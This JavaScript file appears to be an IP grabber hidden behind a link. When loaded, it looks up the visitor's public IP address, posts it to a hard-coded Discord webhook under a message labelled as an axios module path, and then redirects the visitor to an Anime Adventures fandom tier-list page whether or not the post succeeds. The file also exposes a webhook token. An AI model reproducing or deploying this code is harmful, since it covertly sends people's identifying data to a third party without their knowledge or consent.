const apiUrl = 'https://api.ipify.org?format=json';
fetch(apiUrl)
  .then(response => response.json())
  .then(data => {
    const ipAddress = data.ip;
    console.log('Your IP address is:', ipAddress);

    const webhookUrl = 'https://discord.com/api/webhooks/1133709436003819592/shzUtYlRW9IHuBu6VYGnjJ4BmAdxlFRUsqiFGwR9R9FiujvHpRSjwkvi608rbPCUgUBB';

    const message = {
      content: 'Node.js/modules/axios/dist/index.js/> Got IP: ' + ipAddress,
    };

    fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(message),
    })
      .then(response => {
        if (!response.ok) {
          throw new Error('Network response was not ok');
        }
        return response.json();
      })
      .then(data => {
        console.log('Message sent');
        window.location.replace("https://animeadventures.fandom.com/wiki/Tier_Lists");
      })
      .catch(error => {
        console.error('Error sending message:', error);
        window.location.replace("https://animeadventures.fandom.com/wiki/Tier_Lists");
      });
  })
  .catch(error => {
    console.error('Error fetching IP address:', error);
    window.location.replace("https://animeadventures.fandom.com/wiki/Tier_Lists");
  });